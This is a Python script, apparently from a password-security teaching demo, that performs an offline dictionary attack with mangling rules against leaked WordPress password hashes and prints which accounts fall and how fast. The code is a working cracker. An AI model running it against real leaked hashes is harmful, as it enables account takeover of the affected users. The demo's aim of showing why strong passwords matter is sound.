"""
crack.py — ATTACKER SIDE.

This is the offline dictionary attack, the same logic Hashcat/John run (just
slower and in plain Python so you can read every line). We have the leaked
hashes. We have a wordlist. For each account we try every candidate password,
optionally with cheap "mangling rules" (the mutations real crackers apply:
capitalize, append a year, leet-swap). First hash that matches wins.

The lesson is in the TIMING and the COUNTS printed at the end:
  - weak passwords fall in a handful of guesses, basically instantly
  - a 16-char random password isn't in the list and never will be,
    so it survives the entire run untouched.
"""

import csv
import itertools
import time
import wp_phpass


def mangle(word):
    """A few of the rules real crackers apply to stretch a wordlist."""
    seen = set()
    candidates = [
        word,
        word.capitalize(),
        word.upper(),
        word + '!',
        word + '1',
        word + '123',
        word + '2024',
        word + '2024!',
        word.capitalize() + '2024!',
        word.replace('a', '@').replace('o', '0').replace('i', '1'),
    ]
    for c in candidates:
        if c not in seen:
            seen.add(c)
            yield c


def load_wordlist(path):
    with open(path, encoding='utf-8', errors='ignore') as f:
        for line in f:
            w = line.strip()
            if w:
                yield w


def crack_account(username, stored_hash, wordlist_path, use_rules=True):
    tried = 0
    start = time.perf_counter()
    for base in load_wordlist(wordlist_path):
        candidates = mangle(base) if use_rules else [base]
        for guess in candidates:
            tried += 1
            if wp_phpass.verify(guess, stored_hash):
                elapsed = time.perf_counter() - start
                return guess, tried, elapsed
    return None, tried, time.perf_counter() - start


def main():
    wordlist = 'wordlist.txt'
    print(f'{"USER":<12} {"RESULT":<22} {"GUESSES":>9} {"TIME":>9}')
    print('-' * 56)
    with open('leaked_wp_users.csv') as f:
        for row in csv.DictReader(f):
            user = row['user_login']
            stored = row['user_pass']
            found, tried, elapsed = crack_account(user, stored, wordlist)
            result = f'CRACKED -> {found}' if found else 'not cracked'
            print(f'{user:<12} {result:<22} {tried:>9,} {elapsed:>7.2f}s')
    print('-' * 56)
    print('Anything still "not cracked" is what a strong password buys you.')


if __name__ == '__main__':
    main()
